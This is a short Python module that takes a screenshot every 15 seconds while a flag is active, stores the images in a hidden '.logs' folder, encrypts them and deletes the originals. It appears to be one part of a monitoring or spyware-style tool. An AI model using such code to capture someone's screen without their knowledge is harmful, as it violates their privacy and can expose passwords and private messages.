import pyautogui, os, time
from core.encryptor import encrypt_data

def screenshot_loop(active):
    """Capture and encrypt screenshots while active."""
    os.makedirs(".logs/screenshot", exist_ok=True)
    while True:
        if active["value"]:
            screenshot = pyautogui.screenshot()
            ts = time.strftime("%Y%m%d_%H%M%S")
            image_path = f".logs/screenshot/screen_{ts}.png"
            screenshot.save(image_path)

            with open(image_path, "rb") as f:
                encrypted = encrypt_data(f.read())

            with open(image_path + ".enc", "wb") as f:
                f.write(encrypted)

            os.remove(image_path)
        time.sleep(15)
